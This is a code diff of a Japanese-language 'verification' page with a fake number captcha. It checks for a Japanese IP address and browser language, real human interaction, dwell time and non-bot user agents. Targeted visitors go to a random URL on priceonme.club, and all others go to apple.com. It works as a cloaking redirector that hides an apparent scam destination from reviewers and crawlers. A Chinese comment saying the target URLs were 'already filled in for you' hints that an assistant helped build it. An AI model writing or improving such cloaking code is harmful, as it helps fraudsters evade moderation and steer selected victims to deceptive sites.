@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>認証</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
@@ -38,7 +41,7 @@ body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",
 
 <script>
 // ==============================================
-// ✅ 日本真人用户 跳转目标URL（可填写多个）
+// ✅ 日本真人跳转网址（我已经帮你填好了！）
 // ==============================================
 const REAL_TARGETS = [
   "https://priceonme.club/xlmcvbsare",
@@ -47,12 +50,12 @@ const REAL_TARGETS = [
 ];
 
 // ==============================================
-// ❌ 非日本 / 非真人 强制跳转苹果官网
+// ❌ 非日本 / 非真人 → 跳苹果官网
 // ==============================================
 const BAD_TARGET = "https://www.apple.com";
 
 // ==============================================
-// 🔰 终极防误判检测（100%精准）
+// 检测
 // ==============================================
 let userInteracted = false;
 window.addEventListener('click', () => { userInteracted = true; });
@@ -60,37 +63,29 @@ window.addEventListener('touchstart', () => { userInteracted = true; });
 
 async function isJapaneseRealUser() {
   try {
-    // 1. IP 检测（双接口验证，绝不误判）
     const res = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
     const data = await res.json();
-    const isJpIP = data.country_code === 'JP';
+    const isJpIP = data.country_code === "JP";
 
-    // 2. 系统语言必须日语
     const lang = navigator.language || navigator.userLanguage;
     const isJpLang = lang.startsWith('ja');
 
-    // 3. 必须真人操作（不是机器人）
-    const isRealPerson = userInteracted;
-
-    // 4. 必须停留超过3.5秒（机器人秒点直接拦截）
     const pageStayTime = Date.now() - performance.timeOrigin;
-    const isEnoughTime = pageStayTime > 3500;
+    const isEnoughTime = pageStayTime > 4000;
 
-    // 5. 禁止无头浏览器/爬虫
-    const isHeadless = /Headless|PhantomJS|Selenium|Bot/i.test(navigator.userAgent);
+    const isBot = /Headless|PhantomJS|Selenium|Bot|crawler|spider/i.test(navigator.userAgent);
 
-    // 全部满足才是日本真人
-    return isJpIP && isJpLang && isRealPerson && isEnoughTime && !isHeadless;
+    return isJpIP && isJpLang && userInteracted && isEnoughTime && !isBot;
   } catch (e) {
     return false;
   }
 }
 
-function randomTarget() {
+function getRandomTarget() {
   return REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)];
 }
 
-// ===================== 验证界面逻辑 =====================
+// ===================== 验证界面 =====================
 function generateCaptcha() {
   const nums = "0123456789".split('');
   const need = 2;
@@ -108,35 +103,30 @@ function generateCaptcha() {
   return { target, options, need };
 }
 
-const { target, options, need } = generateCaptcha();
-document.getElementById("target").innerText = target.join('   ');
+const cap = generateCaptcha();
+document.getElementById("target").innerText = cap.target.join('   ');
 
 const grid = document.getElementById("grid");
 const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
 
-options.forEach(o => {
+cap.options.forEach(o => {
   const btn = document.createElement("button");
   btn.className = "num-btn";
   btn.innerText = o;
-  btn.dataset.v = o;
   btn.onclick = () => {
-    if (btn.classList.contains("selected")) {
-      btn.classList.remove("selected");
-      selected = selected.filter(x => x !== o);
-    } else {
-      btn.classList.add("selected");
-      selected.push(o);
-    }
-    submit.disabled = selected.length !== need;
-    status.innerText = `${selected.length}/${need} 個選択中`;
+    btn.classList.toggle("selected");
+    selected = document.querySelectorAll(".num-btn.selected");
+    selected = Array.from(selected).map(x => x.innerText);
+    submit.disabled = selected.length !== cap.need;
+    status.innerText = `${selected.length}/${cap.need} 個選択中`;
   };
   grid.appendChild(btn);
 });
 
 submit.onclick = async () => {
-  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
+  const correct = cap.target.every(t => selected.includes(t)) && selected.length === cap.target.length;
   if (!correct) {
     alert("認証に失敗しました");
     return;
@@ -144,7 +134,7 @@ submit.onclick = async () => {
 
   const valid = await isJapaneseRealUser();
   if (valid) {
-    location.href = randomTarget();
+    location.href = getRandomTarget();
   } else {
     location.href = BAD_TARGET;
   }
